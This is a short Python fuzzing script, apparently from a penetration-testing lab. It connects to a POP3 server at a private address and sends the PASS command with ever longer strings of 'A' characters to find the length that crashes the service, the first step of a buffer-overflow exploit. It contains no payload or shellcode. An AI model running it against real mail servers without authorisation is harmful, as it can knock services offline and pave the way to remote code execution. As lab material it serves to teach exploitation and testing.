#!/usr/bin/python
import socket
ip = "10.11.15.25"

buf=["A"]
counter=100

while len(buf) <= 30:
    buf.append("A"*counter)
    counter += 200

for string in buf:
    print("Fuzzer PASS with %s bytes" %len(string))

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("\nSending evil buffer...")
        s.connect((ip, 110))    # Connect to ip at POP3 port
        data = s.recv(1024)     # receive banner
        print(data)             # print banner
        
        s.send('USER test\r\n') # send username test
        data = s.recv(1024)     # receive banner
        print(data)             # print banner
    
        s.send('PASS '+ string +'\r\n') # send password test
        data = s.recv(1024)     # receive banner
        print(data)             # print banner

        s.send('QUIT\r\n')      # send quit message
        s.close()               # close socket
        print("\nDone!")
    except:
        print("Could not connect to POP3!")
        raise
